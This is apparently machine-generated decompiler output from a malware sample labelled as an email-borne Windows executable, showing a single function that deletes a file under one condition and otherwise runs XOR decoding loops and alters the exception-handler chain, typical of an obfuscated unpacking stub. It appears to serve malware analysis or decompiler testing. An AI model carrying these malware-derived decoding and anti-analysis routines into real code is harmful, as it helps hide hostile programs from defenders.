// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1221/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn004011C8(word32 eax, word32 edx, word32 ebp, word32 esi, Eq_79 * fs, word32 dwArg00)
{
// def fp
// def esi
// def dwArg00
// def Mem0
// def dx
// def fs
	__ror(esi, 0x15);
	if (dwArg00->w0007 != 0x9090)
	{
		DeleteFileA(&dwArg00->w0007);
		return;
	}
	else
	{
		eax_63 = Mem0[DPB(0x00126B87, dx, 0, 16):word32];
		esi_66 = 0x004010DA;
		edx_69 = globals->dw4010DA;
		do
		{
// esi_77 = PHI(esi_66, esi_90)
// eax_78 = PHI(eax_63, eax_79)
			esi_81 = esi_77 ^ 0x766BD1ED;
			eax_79 = eax_78 - 0xFFFFFFFF;
			esi_90 = DPB(esi_81 + 0x5CCBD2C5, (word16) (esi_81 + 0x5CCBD2C5) | 0xFF8B, 0, 16);
		} while (~*eax_79 + edx_69 != 0x00000001);
		__rol(-esi_90, 0x06);
		ecx_118 = dwArg00;
		edx_122 = globals->dw40102D;
		do
		{
// ecx_128 = PHI(ecx_118, ecx_133)
			esi_130 = ecx_128->dw0000;
			__rol((word16) esi_130, 0x0E);
			ecx_133 = ecx_128 + 0x00000001;
		} while ((esi_130 ^ edx_122) != 0x00000000);
		fs->dw0000 = fp - 0x00000008;
		return;
	}
}

